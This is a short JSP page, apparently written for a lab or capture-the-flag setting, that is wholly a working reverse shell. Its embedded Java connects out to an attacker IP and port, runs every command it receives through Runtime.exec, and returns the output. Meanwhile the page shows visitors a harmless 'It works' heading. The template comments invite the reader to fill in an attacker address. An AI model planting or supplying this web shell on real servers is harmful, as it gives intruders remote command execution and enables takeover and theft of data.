<%-- Make a reverse shell using jsp --%> 

<html>
	<head>
		<title>Reverse Shell Script</title>
	</head>
	<body>
		<!-- Java code here -->
		<%
		try {
		    String host = "10.10.14.6"; // Replace with your attacker's IP
		    int port = 4444; // Replace with your attacker's listening port
		    Socket s = new Socket(host, port);
		    PrintWriter out = new PrintWriter(s.getOutputStream(), true);
		    BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));

		    String command;
		    while ((command = in.readLine()) != null) {
			Process p = Runtime.getRuntime().exec(command);
			BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
			String line;
			while ((line = reader.readLine()) != null) {
			    out.println(line);
			}
			reader.close();
		    }
		    s.close();
		} catch (Exception e) {
		    e.printStackTrace();
		}
	%>
		<h1>It works</h1>

	</body>

</html>
